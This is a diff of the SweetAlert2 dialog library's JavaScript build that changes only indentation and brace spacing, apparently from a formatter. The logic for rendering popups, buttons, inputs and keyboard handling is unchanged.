@@ -6,8 +6,8 @@
   "object" == typeof exports && "undefined" != typeof module
     ? (module.exports = e())
     : "function" == typeof define && define.amd
-    ? define(e)
-    : ((t =
+      ? define(e)
+      : ((t =
         "undefined" != typeof globalThis ? globalThis : t || self).Sweetalert2 =
         e());
 })(this, function () {
@@ -45,9 +45,9 @@
   function o() {
     try {
       var t = !Boolean.prototype.valueOf.call(
-        Reflect.construct(Boolean, [], function () {})
+        Reflect.construct(Boolean, [], function () { })
       );
-    } catch (t) {}
+    } catch (t) { }
     return (o = function () {
       return !!t;
     })();
@@ -70,16 +70,16 @@
       (r =
         "function" == typeof Symbol && "symbol" == typeof Symbol.iterator
           ? function (t) {
-              return typeof t;
-            }
+            return typeof t;
+          }
           : function (t) {
-              return t &&
-                "function" == typeof Symbol &&
-                t.constructor === Symbol &&
-                t !== Symbol.prototype
-                ? "symbol"
-                : typeof t;
-            }),
+            return t &&
+              "function" == typeof Symbol &&
+              t.constructor === Symbol &&
+              t !== Symbol.prototype
+              ? "symbol"
+              : typeof t;
+          }),
       r(t)
     );
   }
@@ -109,8 +109,8 @@
       (s = Object.setPrototypeOf
         ? Object.getPrototypeOf.bind()
         : function (t) {
-            return t.__proto__ || Object.getPrototypeOf(t);
-          }),
+          return t.__proto__ || Object.getPrototypeOf(t);
+        }),
       s(t)
     );
   }
@@ -119,8 +119,8 @@
       (l = Object.setPrototypeOf
         ? Object.setPrototypeOf.bind()
         : function (t, e) {
-            return (t.__proto__ = e), t;
-          }),
+          return (t.__proto__ = e), t;
+        }),
       l(t, e)
     );
   }
@@ -130,22 +130,22 @@
         "undefined" != typeof Reflect && Reflect.get
           ? Reflect.get.bind()
           : function (t, e, n) {
-              var o = (function (t, e) {
-                for (
-                  ;
-                  !Object.prototype.hasOwnProperty.call(t, e) &&
-                  null !== (t = s(t));
+            var o = (function (t, e) {
+              for (
+                ;
+                !Object.prototype.hasOwnProperty.call(t, e) &&
+                null !== (t = s(t));
 
-                );
-                return t;
-              })(t, e);
-              if (o) {
-                var i = Object.getOwnPropertyDescriptor(o, e);
-                return i.get
-                  ? i.get.call(arguments.length < 3 ? t : n)
-                  : i.value;
-              }
-            }),
+              );
+              return t;
+            })(t, e);
+            if (o) {
+              var i = Object.getOwnPropertyDescriptor(o, e);
+              return i.get
+                ? i.get.call(arguments.length < 3 ? t : n)
+                : i.value;
+            }
+          }),
       d.apply(this, arguments)
     );
   }
@@ -159,7 +159,7 @@
           null == t
             ? null
             : ("undefined" != typeof Symbol && t[Symbol.iterator]) ||
-              t["@@iterator"];
+            t["@@iterator"];
         if (null != n) {
           var o,
             i,
@@ -230,8 +230,8 @@
           ? Array.from(t)
           : "Arguments" === n ||
             /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)
-          ? h(t, e)
-          : void 0
+            ? h(t, e)
+            : void 0
       );
     }
   }
@@ -345,7 +345,7 @@
     ) {
       return (t[e] = y + e), t;
     },
-    {}),
+      {}),
     A = "SweetAlert2:",
     k = function (t) {
       return t.charAt(0).toUpperCase() + t.slice(1);
@@ -440,8 +440,8 @@
       var t = H();
       if (!t) return [];
       var e = t.querySelectorAll(
-          '[tabindex]:not([tabindex="-1"]):not([tabindex="0"])'
-        ),
+        '[tabindex]:not([tabindex="-1"]):not([tabindex="0"])'
+      ),
         n = Array.from(e).sort(function (t, e) {
           var n = parseInt(t.getAttribute("tabindex") || "0"),
             o = parseInt(e.getAttribute("tabindex") || "0");
@@ -501,7 +501,7 @@
               t.classList.remove(n);
           });
         })(t, e),
-        e.customClass && e.customClass[n])
+          e.customClass && e.customClass[n])
       ) {
         if ("string" != typeof e.customClass[n] && !e.customClass[n].forEach)
           return void E(
@@ -550,15 +550,15 @@
       t &&
         e &&
         ("string" == typeof e && (e = e.split(/\s+/).filter(Boolean)),
-        e.forEach(function (e) {
-          Array.isArray(t)
-            ? t.forEach(function (t) {
+          e.forEach(function (e) {
+            Array.isArray(t)
+              ? t.forEach(function (t) {
                 n ? t.classList.add(e) : t.classList.remove(e);
               })
-            : n
-            ? t.classList.add(e)
-            : t.classList.remove(e);
-        }));
+              : n
+                ? t.classList.add(e)
+                : t.classList.remove(e);
+          }));
     },
     rt = function (t, e) {
       it(t, e, !0);
@@ -576,9 +576,9 @@
       n === "".concat(parseInt(n)) && (n = parseInt(n)),
         n || 0 === parseInt(n)
           ? t.style.setProperty(
-              e,
-              "number" == typeof n ? "".concat(n, "px") : n
-            )
+            e,
+            "number" == typeof n ? "".concat(n, "px") : n
+          )
           : t.style.removeProperty(e);
     },
     st = function (t) {
@@ -606,11 +606,11 @@
     pt = function (t, e) {
       e
         ? st(
-            t,
-            arguments.length > 2 && void 0 !== arguments[2]
-              ? arguments[2]
-              : "flex"
-          )
+          t,
+          arguments.length > 2 && void 0 !== arguments[2]
+            ? arguments[2]
+            : "flex"
+        )
         : lt(t);
     },
     mt = function (t) {
@@ -633,10 +633,10 @@
       n &&
         mt(n) &&
         (e && ((n.style.transition = "none"), (n.style.width = "100%")),
-        setTimeout(function () {
-          (n.style.transition = "width ".concat(t / 1e3, "s linear")),
-            (n.style.width = "0%");
-        }, 10));
+          setTimeout(function () {
+            (n.style.transition = "width ".concat(t / 1e3, "s linear")),
+              (n.style.width = "0%");
+          }, 10));
     },
     bt = function () {
       return "undefined" == typeof window || "undefined" == typeof document;
@@ -687,11 +687,11 @@
         n =
           !!(e = j()) &&
           (e.remove(),
-          at(
-            [document.documentElement, document.body],
-            [w["no-backdrop"], w["toast-shown"], w["has-column"]]
-          ),
-          !0);
+            at(
+              [document.documentElement, document.body],
+              [w["no-backdrop"], w["toast-shown"], w["has-column"]]
+            ),
+            !0);
       if (bt()) P("SweetAlert2 requires document to initialize");
       else {
         var o = document.createElement("div");
@@ -741,8 +741,8 @@
       t instanceof HTMLElement
         ? e.appendChild(t)
         : "object" === r(t)
-        ? kt(t, e)
-        : t && Q(e, t);
+          ? kt(t, e)
+          : t && Q(e, t);
     },
     kt = function (t, e) {
       t.jquery ? Et(e, t) : Q(e, t.toString());
@@ -767,37 +767,37 @@
         (e.showConfirmButton || e.showDenyButton || e.showCancelButton
           ? st(n)
           : lt(n),
-        et(n, e, "actions"),
-        (function (t, e, n) {
-          var o = F(),
-            i = z(),
-            r = U();
-          if (!o || !i || !r) return;
-          Tt(o, "confirm", n),
-            Tt(i, "deny", n),
-            Tt(r, "cancel", n),
-            (function (t, e, n, o) {
-              if (!o.buttonsStyling) return void at([t, e, n], w.styled);
-              rt([t, e, n], w.styled),
-                o.confirmButtonColor &&
+          et(n, e, "actions"),
+          (function (t, e, n) {
+            var o = F(),
+              i = z(),
+              r = U();
+            if (!o || !i || !r) return;
+            Tt(o, "confirm", n),
+              Tt(i, "deny", n),
+              Tt(r, "cancel", n),
+              (function (t, e, n, o) {
+                if (!o.buttonsStyling) return void at([t, e, n], w.styled);
+                rt([t, e, n], w.styled),
+                  o.confirmButtonColor &&
                   ((t.style.backgroundColor = o.confirmButtonColor),
-                  rt(t, w["default-outline"]));
-              o.denyButtonColor &&
-                ((e.style.backgroundColor = o.denyButtonColor),
-                rt(e, w["default-outline"]));
-              o.cancelButtonColor &&
-                ((n.style.backgroundColor = o.cancelButtonColor),
-                rt(n, w["default-outline"]));
-            })(o, i, r, n),
-            n.reverseButtons &&
+                    rt(t, w["default-outline"]));
+                o.denyButtonColor &&
+                  ((e.style.backgroundColor = o.denyButtonColor),
+                    rt(e, w["default-outline"]));
+                o.cancelButtonColor &&
+                  ((n.style.backgroundColor = o.cancelButtonColor),
+                    rt(n, w["default-outline"]));
+              })(o, i, r, n),
+              n.reverseButtons &&
               (n.toast
                 ? (t.insertBefore(r, o), t.insertBefore(i, o))
                 : (t.insertBefore(r, e),
                   t.insertBefore(i, e),
                   t.insertBefore(o, e)));
-        })(n, o, e),
-        Q(o, e.loaderHtml || ""),
-        et(o, e, "loader"));
+          })(n, o, e),
+          Q(o, e.loaderHtml || ""),
+          et(o, e, "loader"));
     };
   function Tt(t, e, n) {
     var o = k(e);
@@ -814,20 +814,20 @@
         "string" == typeof e
           ? (t.style.background = e)
           : e ||
-            rt([document.documentElement, document.body], w["no-backdrop"]);
+          rt([document.documentElement, document.body], w["no-backdrop"]);
       })(n, e.backdrop),
-      (function (t, e) {
-        if (!e) return;
-        e in w
-          ? rt(t, w[e])
-          : (E('The "position" parameter is not valid, defaulting to "center"'),
-            rt(t, w.center));
-      })(n, e.position),
-      (function (t, e) {
-        if (!e) return;
-        rt(t, w["grow-".concat(e)]);
-      })(n, e.grow),
-      et(n, e, "container"));
+        (function (t, e) {
+          if (!e) return;
+          e in w
+            ? rt(t, w[e])
+            : (E('The "position" parameter is not valid, defaulting to "center"'),
+              rt(t, w.center));
+        })(n, e.position),
+        (function (t, e) {
+          if (!e) return;
+          rt(t, w["grow-".concat(e)]);
+        })(n, e.grow),
+        et(n, e, "container"));
   };
   var St = { innerParams: new WeakMap(), domCache: new WeakMap() },
     Ot = ["input", "file", "range", "select", "radio", "checkbox", "textarea"],
@@ -838,9 +838,9 @@
             n = Vt[t.input](e, t);
           st(e),
             t.inputAutoFocus &&
-              setTimeout(function () {
-                ot(n);
-              });
+            setTimeout(function () {
+              ot(n);
+            });
         } else
           P(
             "Unexpected type of input! Expected "
@@ -858,7 +858,7 @@
               t.removeAttribute(n);
           }
         })(n),
-        e))
+          e))
           n.setAttribute(o, e[o]);
     },
     Mt = function (t) {
@@ -887,12 +887,12 @@
       ["string", "number"].includes(r(e))
         ? (t.value = "".concat(e))
         : L(e) ||
-          E(
-            'Unexpected type of inputValue! Expected "string", "number" or "Promise", got "'.concat(
-              r(e),
-              '"'
-            )
-          );
+        E(
+          'Unexpected type of inputValue! Expected "string", "number" or "Promise", got "'.concat(
+            r(e),
+            '"'
+          )
+        );
     },
     Vt = {};
   (Vt.text =
@@ -907,11 +907,11 @@
     Vt.time =
     Vt.week =
     Vt.month =
-      function (t, e) {
-        return (
-          qt(t, e.inputValue), Ht(t, t, e), It(t, e), (t.type = e.input), t
-        );
-      }),
+    function (t, e) {
+      return (
+        qt(t, e.inputValue), Ht(t, t, e), It(t, e), (t.type = e.input), t
+      );
+    }),
     (Vt.file = function (t, e) {
       return Ht(t, t, e), It(t, e), t;
     }),
@@ -958,7 +958,7 @@
                   i =
                     t.offsetWidth +
                     ((o = t),
-                    parseInt(window.getComputedStyle(o).marginLeft) +
+                      parseInt(window.getComputedStyle(o).marginLeft) +
                       parseInt(window.getComputedStyle(o).marginRight));
                 i > n
                   ? (H().style.width = "".concat(i, "px"))
@@ -971,15 +971,15 @@
       );
     });
   var _t = function (t, e) {
-      var n = V();
-      n &&
-        (dt(n),
+    var n = V();
+    n &&
+      (dt(n),
         et(n, e, "htmlContainer"),
         e.html
           ? (At(e.html, n), st(n, "block"))
           : e.text
-          ? ((n.textContent = e.text), st(n, "block"))
-          : lt(n),
+            ? ((n.textContent = e.text), st(n, "block"))
+            : lt(n),
         (function (t, e) {
           var n = H();
           if (n) {
@@ -992,7 +992,7 @@
               e.input && (i && Lt(e), Mt(e));
           }
         })(t, e));
-    },
+  },
     Rt = function (t, e) {
       for (var n = 0, o = Object.entries(C); n < o.length; n++) {
         var i = f(o[n], 2),
@@ -1007,12 +1007,12 @@
       if (t)
         for (
           var e = window
-              .getComputedStyle(t)
-              .getPropertyValue("background-color"),
-            n = t.querySelectorAll(
-              "[class^=swal2-success-circular-line], .swal2-success-fix"
-            ),
-            o = 0;
+            .getComputedStyle(t)
+            .getPropertyValue("background-color"),
+          n = t.querySelectorAll(
+            "[class^=swal2-success-circular-line], .swal2-success-fix"
+          ),
+          o = 0;
           o < n.length;
           o++
         )
@@ -1041,12 +1041,12 @@
         (t.style.color = e.iconColor), (t.style.borderColor = e.iconColor);
         for (
           var n = 0,
-            o = [
-              ".swal2-success-line-tip",
-              ".swal2-success-line-long",
-              ".swal2-x-mark-line-left",
-              ".swal2-x-mark-line-right",
-            ];
+          o = [
+            ".swal2-success-line-tip",
+            ".swal2-success-line-long",
+            ".swal2-x-mark-line-left",
+            ".swal2-x-mark-line-right",
+          ];
           n < o.length;
           n++
         ) {
@@ -1108,15 +1108,15 @@
               ? (st(n),
                 (n.textContent = ""),
                 i >= o.length &&
-                  E(
-                    "Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)"
-                  ),
+                E(
+                  "Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)"
+                ),
                 o.forEach(function (t, r) {
                   var a = Kt(t);
                   if (
                     (n.appendChild(a),
-                    r === i && rt(a, w["active-progress-step"]),
-                    r !== o.length - 1)
+                      r === i && rt(a, w["active-progress-step"]),
+                      r !== o.length - 1)
                   ) {
                     var c = Yt(e);
                     n.appendChild(c);
@@ -1162,18 +1162,18 @@
           var n = q();
           n &&
             (dt(n),
-            pt(n, e.title || e.titleText, "block"),
-            e.title && At(e.title, n),
-            e.titleText && (n.innerText = e.titleText),
-            et(n, e, "title"));
+              pt(n, e.title || e.titleText, "block"),
+              e.title && At(e.title, n),
+              e.titleText && (n.innerText = e.titleText),
+              et(n, e, "title"));
         })(0, e),
         (function (t, e) {
           var n = $();
           n &&
             (Q(n, e.closeButtonHtml || ""),
-            et(n, e, "closeButton"),
-            pt(n, e.showCloseButton),
-            n.setAttribute("aria-label", e.closeButtonAriaLabel || ""));
+              et(n, e, "closeButton"),
+              pt(n, e.showCloseButton),
+              n.setAttribute("aria-label", e.closeButtonAriaLabel || ""));
         })(0, e),
         _t(t, e),
         Bt(0, e),
@@ -1181,9 +1181,9 @@
           var n = Y();
           n &&
             (dt(n),
-            pt(n, e.footer, "block"),
-            e.footer && At(e.footer, n),
-            et(n, e, "footer"));
+              pt(n, e.footer, "block"),
+              e.footer && At(e.footer, n),
+              et(n, e, "footer"));
         })(0, e);
       var n = H();
       "function" == typeof e.didRender && n && e.didRender(n);
@@ -1205,7 +1205,7 @@
         (t.keydownTarget.removeEventListener("keydown", t.keydownHandler, {
           capture: t.keydownListenerCapture,
         }),
-        (t.keydownHandlerAdded = !1));
+          (t.keydownHandlerAdded = !1));
     },
     Gt = function (t, e) {
       var n,
@@ -1224,13 +1224,13 @@
         (e.isComposing ||
           229 === e.keyCode ||
           (t.stopKeydownPropagation && e.stopPropagation(),
-          "Enter" === e.key
-            ? ne(e, t)
-            : "Tab" === e.key
-            ? oe(e)
-            : [].concat(Qt, te).includes(e.key)
-            ? ie(e.key)
-            : "Escape" === e.key && re(e, t, n)));
+            "Enter" === e.key
+              ? ne(e, t)
+              : "Tab" === e.key
+                ? oe(e)
+                : [].concat(Qt, te).includes(e.key)
+                  ? ie(e.key)
+                  : "Escape" === e.key && re(e, t, n)));
     },
     ne = function (t, e) {
       if (x(e.allowEnterKey)) {
@@ -1268,8 +1268,8 @@
           r.includes(document.activeElement)
         ) {
           var a = Qt.includes(t)
-              ? "nextElementSibling"
-              : "previousElementSibling",
+            ? "nextElementSibling"
+            : "previousElementSibling",
             c = document.activeElement;
           if (c) {
             for (var u = 0; u < e.children.length; u++) {
@@ -1292,9 +1292,9 @@
       Array.from(document.body.children).forEach(function (t) {
         t.hasAttribute("data-previous-aria-hidden")
           ? (t.setAttribute(
-              "aria-hidden",
-              t.getAttribute("data-previous-aria-hidden") || ""
-            ),
+            "aria-hidden",
+            t.getAttribute("data-previous-aria-hidden") || ""
+          ),
             t.removeAttribute("data-previous-aria-hidden"))
           : t.removeAttribute("aria-hidden");
       });
@@ -1307,9 +1307,9 @@
         ((e.ontouchstart = function (e) {
           t = le(e);
         }),
-        (e.ontouchmove = function (e) {
-          t && (e.preventDefault(), e.stopPropagation());
-        }));
+          (e.ontouchmove = function (e) {
+            t && (e.preventDefault(), e.stopPropagation());
+          }));
     },
     le = function (t) {
       var e = t.target,
@@ -1344,8 +1344,8 @@
             .getComputedStyle(document.body)
             .getPropertyValue("padding-right")
         )),
-        (document.body.style.paddingRight = "".concat(
-          pe +
+          (document.body.style.paddingRight = "".concat(
+            pe +
             (function () {
               var t = document.createElement("div");
               (t.className = w["scrollbar-measure"]),
@@ -1353,15 +1353,15 @@
               var e = t.getBoundingClientRect().width - t.clientWidth;
               return document.body.removeChild(t), e;
             })(),
-          "px"
-        )));
+            "px"
+          )));
     };
   function he(t, e, n, o) {
     G()
       ? ke(t, o)
       : (b(n).then(function () {
-          return ke(t, o);
-        }),
+        return ke(t, o);
+      }),
         Xt(g)),
       ue
         ? (e.setAttribute("style", "display:none !important"),
@@ -1369,8 +1369,8 @@
           (e.innerHTML = ""))
         : e.remove(),
       X() &&
-        (null !== pe &&
-          ((document.body.style.paddingRight = "".concat(pe, "px")),
+      (null !== pe &&
+        ((document.body.style.paddingRight = "".concat(pe, "px")),
           (pe = null)),
         (function () {
           if (tt(document.body, w.iosfix)) {
@@ -1408,9 +1408,9 @@
     ye(this), e && e(t);
   }
   var ye = function (t) {
-      t.isAwaitingPromise &&
-        (delete t.isAwaitingPromise, St.innerParams.get(t) || t._destroy());
-    },
+    t.isAwaitingPromise &&
+      (delete t.isAwaitingPromise, St.innerParams.get(t) || t._destroy());
+  },
     we = function (t) {
       return void 0 === t
         ? { isConfirmed: !1, isDenied: !1, isDismissed: !0 }
@@ -1427,11 +1427,11 @@
     Ae = function (t, e, n, o, i) {
       Pt &&
         ((g.swalCloseEventFinishedCallback = he.bind(null, t, n, o, i)),
-        e.addEventListener(Pt, function (t) {
-          t.target === e &&
-            (g.swalCloseEventFinishedCallback(),
-            delete g.swalCloseEventFinishedCallback);
-        }));
+          e.addEventListener(Pt, function (t) {
+            t.target === e &&
+              (g.swalCloseEventFinishedCallback(),
+                delete g.swalCloseEventFinishedCallback);
+          }));
     },
     ke = function (t, e) {
       setTimeout(function () {
@@ -1456,12 +1456,12 @@
       n &&
         o &&
         (!e && mt(F()) && (e = F()),
-        st(n),
-        e &&
+          st(n),
+          e &&
           (lt(e),
-          o.setAttribute("data-button-to-replace", e.className),
-          n.insertBefore(o, e)),
-        rt([t, n], w.loading));
+            o.setAttribute("data-button-to-replace", e.className),
+            n.insertBefore(o, e)),
+          rt([t, n], w.loading));
     },
     Be = function (t) {
       return t.checked ? 1 : 0;
@@ -1482,53 +1482,53 @@
         var o = function (t) {
           "select" === e.input
             ? (function (t, e, n) {
-                var o = ct(t, w.select);
-                if (!o) return;
-                var i = function (t, e, o) {
-                  var i = document.createElement("option");
-                  (i.value = o),
-                    Q(i, e),
-                    (i.selected = je(o, n.inputValue)),
-                    t.appendChild(i);
-                };
-                e.forEach(function (t) {
-                  var e = t[0],
-                    n = t[1];
-                  if (Array.isArray(n)) {
-                    var r = document.createElement("optgroup");
-                    (r.label = e),
-                      (r.disabled = !1),
-                      o.appendChild(r),
-                      n.forEach(function (t) {
-                        return i(r, t[1], t[0]);
-                      });
-                  } else i(o, n, e);
-                }),
-                  o.focus();
-              })(n, Le(t), e)
+              var o = ct(t, w.select);
+              if (!o) return;
+              var i = function (t, e, o) {
+                var i = document.createElement("option");
+                (i.value = o),
+                  Q(i, e),
+                  (i.selected = je(o, n.inputValue)),
+                  t.appendChild(i);
+              };
+              e.forEach(function (t) {
+                var e = t[0],
+                  n = t[1];
+                if (Array.isArray(n)) {
+                  var r = document.createElement("optgroup");
+                  (r.label = e),
+                    (r.disabled = !1),
+                    o.appendChild(r),
+                    n.forEach(function (t) {
+                      return i(r, t[1], t[0]);
+                    });
+                } else i(o, n, e);
+              }),
+                o.focus();
+            })(n, Le(t), e)
             : "radio" === e.input &&
-              (function (t, e, n) {
-                var o = ct(t, w.radio);
-                if (!o) return;
-                e.forEach(function (t) {
-                  var e = t[0],
-                    i = t[1],
-                    r = document.createElement("input"),
-                    a = document.createElement("label");
-                  (r.type = "radio"),
-                    (r.name = w.radio),
-                    (r.value = e),
-                    je(e, n.inputValue) && (r.checked = !0);
-                  var c = document.createElement("span");
-                  Q(c, i),
-                    (c.className = w.label),
-                    a.appendChild(r),
-                    a.appendChild(c),
-                    o.appendChild(a);
-                });
-                var i = o.querySelectorAll("input");
-                i.length && i[0].focus();
-              })(n, Le(t), e);
+            (function (t, e, n) {
+              var o = ct(t, w.radio);
+              if (!o) return;
+              e.forEach(function (t) {
+                var e = t[0],
+                  i = t[1],
+                  r = document.createElement("input"),
+                  a = document.createElement("label");
+                (r.type = "radio"),
+                  (r.name = w.radio),
+                  (r.value = e),
+                  je(e, n.inputValue) && (r.checked = !0);
+                var c = document.createElement("span");
+                Q(c, i),
+                  (c.className = w.label),
+                  a.appendChild(r),
+                  a.appendChild(c),
+                  o.appendChild(a);
+              });
+              var i = o.querySelectorAll("input");
+              i.length && i[0].focus();
+            })(n, Le(t), e);
         };
         S(e.inputOptions) || L(e.inputOptions)
           ? (Ee(F()),
@@ -1536,8 +1536,8 @@
               t.hideLoading(), o(e);
             }))
           : "object" === r(e.inputOptions)
-          ? o(e.inputOptions)
-          : P(
+            ? o(e.inputOptions)
+            : P(
               "Unexpected type of inputOptions! Expected object, Map or Promise, got ".concat(
                 r(e.inputOptions)
               )
@@ -1548,39 +1548,39 @@
       var n = t.getInput();
       n &&
         (lt(n),
-        O(e.inputValue)
-          .then(function (o) {
-            (n.value =
-              "number" === e.input
-                ? "".concat(parseFloat(o) || 0)
-                : "".concat(o)),
-              st(n),
-              n.focus(),
-              t.hideLoading();
-          })
-          .catch(function (e) {
-            P("Error in inputValue promise: ".concat(e)),
-              (n.value = ""),
-              st(n),
-              n.focus(),
-              t.hideLoading();
-          }));
+          O(e.inputValue)
+            .then(function (o) {
+              (n.value =
+                "number" === e.input
+                  ? "".concat(parseFloat(o) || 0)
+                  : "".concat(o)),
+                st(n),
+                n.focus(),
+                t.hideLoading();
+            })
+            .catch(function (e) {
+              P("Error in inputValue promise: ".concat(e)),
+                (n.value = ""),
+                st(n),
+                n.focus(),
+                t.hideLoading();
+            }));
     };
   var Le = function t(e) {
-      var n = [];
-      return (
-        e instanceof Map
-          ? e.forEach(function (e, o) {
-              var i = e;
-              "object" === r(i) && (i = t(i)), n.push([o, i]);
-            })
-          : Object.keys(e).forEach(function (o) {
-              var i = e[o];
-              "object" === r(i) && (i = t(i)), n.push([o, i]);
-            }),
-        n
-      );
-    },
+    var n = [];
+    return (
+      e instanceof Map
+        ? e.forEach(function (e, o) {
+          var i = e;
+          "object" === r(i) && (i = t(i)), n.push([o, i]);
+        })
+        : Object.keys(e).forEach(function (o) {
+          var i = e[o];
+          "object" === r(i) && (i = t(i)), n.push([o, i]);
+        }),
+      n
+    );
+  },
     je = function (t, e) {
       return !!e && e.toString() === t.toString();
     },
@@ -1606,11 +1606,11 @@
         n.inputValidator
           ? He(t, i, e)
           : o && !o.checkValidity()
-          ? (t.enableButtons(),
-            t.showValidationMessage(n.validationMessage || o.validationMessage))
-          : "deny" === e
-          ? De(t, i)
-          : _e(t, i);
+            ? (t.enableButtons(),
+              t.showValidationMessage(n.validationMessage || o.validationMessage))
+            : "deny" === e
+              ? De(t, i)
+              : _e(t, i);
       } else
         P(
           'The "input" parameter is needed to be set when using returnInputValueOn'.concat(
@@ -1631,8 +1631,8 @@
               o
                 ? t.showValidationMessage(o)
                 : "deny" === n
-                ? De(t, e)
-                : _e(t, e);
+                  ? De(t, e)
+                  : _e(t, e);
           });
     },
     De = function (t, e) {
@@ -1741,15 +1741,15 @@
     Q(e.validationMessage, t),
       (e.validationMessage.className = w["validation-message"]),
       n.customClass &&
-        n.customClass.validationMessage &&
-        rt(e.validationMessage, n.customClass.validationMessage),
+      n.customClass.validationMessage &&
+      rt(e.validationMessage, n.customClass.validationMessage),
       st(e.validationMessage);
     var o = this.getInput();
     o &&
       (o.setAttribute("aria-invalid", "true"),
-      o.setAttribute("aria-describedby", w["validation-message"]),
-      ot(o),
-      rt(o, w.inputerror));
+        o.setAttribute("aria-describedby", w["validation-message"]),
+        ot(o),
+        rt(o, w.inputerror));
   }
   function Je() {
     var t = St.domCache.get(this);
@@ -1757,100 +1757,100 @@
     var e = this.getInput();
     e &&
       (e.removeAttribute("aria-invalid"),
-      e.removeAttribute("aria-describedby"),
-      at(e, w.inputerror));
+        e.removeAttribute("aria-describedby"),
+        at(e, w.inputerror));
   }
   var Xe = {
-      title: "",
-      titleText: "",
-      text: "",
-      html: "",
-      footer: "",
-      icon: void 0,
-      iconColor: void 0,
-      iconHtml: void 0,
-      template: void 0,
-      toast: !1,
-      animation: !0,
-      showClass: {
-        popup: "swal2-show",
-        backdrop: "swal2-backdrop-show",
-        icon: "swal2-icon-show",
-      },
-      hideClass: {
-        popup: "swal2-hide",
-        backdrop: "swal2-backdrop-hide",
-        icon: "swal2-icon-hide",
-      },
-      customClass: {},
-      target: "body",
-      color: void 0,
-      backdrop: !0,
-      heightAuto: !0,
-      allowOutsideClick: !0,
-      allowEscapeKey: !0,
-      allowEnterKey: !0,
-      stopKeydownPropagation: !0,
-      keydownListenerCapture: !1,
-      showConfirmButton: !0,
-      showDenyButton: !1,
-      showCancelButton: !1,
-      preConfirm: void 0,
-      preDeny: void 0,
-      confirmButtonText: "OK",
-      confirmButtonAriaLabel: "",
-      confirmButtonColor: void 0,
-      denyButtonText: "No",
-      denyButtonAriaLabel: "",
-      denyButtonColor: void 0,
-      cancelButtonText: "Cancel",
-      cancelButtonAriaLabel: "",
-      cancelButtonColor: void 0,
-      buttonsStyling: !0,
-      reverseButtons: !1,
-      focusConfirm: !0,
-      focusDeny: !1,
-      focusCancel: !1,
-      returnFocus: !0,
-      showCloseButton: !1,
-      closeButtonHtml: "&times;",
-      closeButtonAriaLabel: "Close this dialog",
-      loaderHtml: "",
-      showLoaderOnConfirm: !1,
-      showLoaderOnDeny: !1,
-      imageUrl: void 0,
-      imageWidth: void 0,
-      imageHeight: void 0,
-      imageAlt: "",
-      timer: void 0,
-      timerProgressBar: !1,
-      width: void 0,
-      padding: void 0,
-      background: void 0,
-      input: void 0,
-      inputPlaceholder: "",
-      inputLabel: "",
-      inputValue: "",
-      inputOptions: {},
-      inputAutoFocus: !0,
-      inputAutoTrim: !0,
-      inputAttributes: {},
-      inputValidator: void 0,
-      returnInputValueOnDeny: !1,
-      validationMessage: void 0,
-      grow: !1,
-      position: "center",
-      progressSteps: [],
-      currentProgressStep: void 0,
-      progressStepsDistance: void 0,
-      willOpen: void 0,
-      didOpen: void 0,
-      didRender: void 0,
-      willClose: void 0,
-      didClose: void 0,
-      didDestroy: void 0,
-      scrollbarPadding: !0,
+    title: "",
+    titleText: "",
+    text: "",
+    html: "",
+    footer: "",
+    icon: void 0,
+    iconColor: void 0,
+    iconHtml: void 0,
+    template: void 0,
+    toast: !1,
+    animation: !0,
+    showClass: {
+      popup: "swal2-show",
+      backdrop: "swal2-backdrop-show",
+      icon: "swal2-icon-show",
     },
+    hideClass: {
+      popup: "swal2-hide",
+      backdrop: "swal2-backdrop-hide",
+      icon: "swal2-icon-hide",
+    },
+    customClass: {},
+    target: "body",
+    color: void 0,
+    backdrop: !0,
+    heightAuto: !0,
+    allowOutsideClick: !0,
+    allowEscapeKey: !0,
+    allowEnterKey: !0,
+    stopKeydownPropagation: !0,
+    keydownListenerCapture: !1,
+    showConfirmButton: !0,
+    showDenyButton: !1,
+    showCancelButton: !1,
+    preConfirm: void 0,
+    preDeny: void 0,
+    confirmButtonText: "OK",
+    confirmButtonAriaLabel: "",
+    confirmButtonColor: void 0,
+    denyButtonText: "No",
+    denyButtonAriaLabel: "",
+    denyButtonColor: void 0,
+    cancelButtonText: "Cancel",
+    cancelButtonAriaLabel: "",
+    cancelButtonColor: void 0,
+    buttonsStyling: !0,
+    reverseButtons: !1,
+    focusConfirm: !0,
+    focusDeny: !1,
+    focusCancel: !1,
+    returnFocus: !0,
+    showCloseButton: !1,
+    closeButtonHtml: "&times;",
+    closeButtonAriaLabel: "Close this dialog",
+    loaderHtml: "",
+    showLoaderOnConfirm: !1,
+    showLoaderOnDeny: !1,
+    imageUrl: void 0,
+    imageWidth: void 0,
+    imageHeight: void 0,
+    imageAlt: "",
+    timer: void 0,
+    timerProgressBar: !1,
+    width: void 0,
+    padding: void 0,
+    background: void 0,
+    input: void 0,
+    inputPlaceholder: "",
+    inputLabel: "",
+    inputValue: "",
+    inputOptions: {},
+    inputAutoFocus: !0,
+    inputAutoTrim: !0,
+    inputAttributes: {},
+    inputValidator: void 0,
+    returnInputValueOnDeny: !1,
+    validationMessage: void 0,
+    grow: !1,
+    position: "center",
+    progressSteps: [],
+    currentProgressStep: void 0,
+    progressStepsDistance: void 0,
+    willOpen: void 0,
+    didOpen: void 0,
+    didRender: void 0,
+    willClose: void 0,
+    didClose: void 0,
+    didDestroy: void 0,
+    scrollbarPadding: !0,
+  },
     Ge = [
       "allowEscapeKey",
       "allowOutsideClick",
@@ -1959,20 +1959,20 @@
       e = St.innerParams.get(this);
     e
       ? (t.popup &&
-          g.swalCloseEventFinishedCallback &&
-          (g.swalCloseEventFinishedCallback(),
+        g.swalCloseEventFinishedCallback &&
+        (g.swalCloseEventFinishedCallback(),
           delete g.swalCloseEventFinishedCallback),
         "function" == typeof e.didDestroy && e.didDestroy(),
         dn(this))
       : fn(this);
   }
   var dn = function (t) {
-      fn(t),
-        delete t.params,
-        delete g.keydownHandler,
-        delete g.keydownTarget,
-        delete g.currentInstance;
-    },
+    fn(t),
+      delete t.params,
+      delete g.keydownHandler,
+      delete g.keydownTarget,
+      delete g.currentInstance;
+  },
     fn = function (t) {
       t.isAwaitingPromise
         ? (pn(St, t), (t.isAwaitingPromise = !0))
@@ -2036,7 +2036,7 @@
     bn = function (t) {
       t.popup.onmousedown = function () {
         t.container.onmouseup = function (e) {
-          (t.container.onmouseup = function () {}),
+          (t.container.onmouseup = function () { }),
             e.target === t.container && (gn = !0);
         };
       };
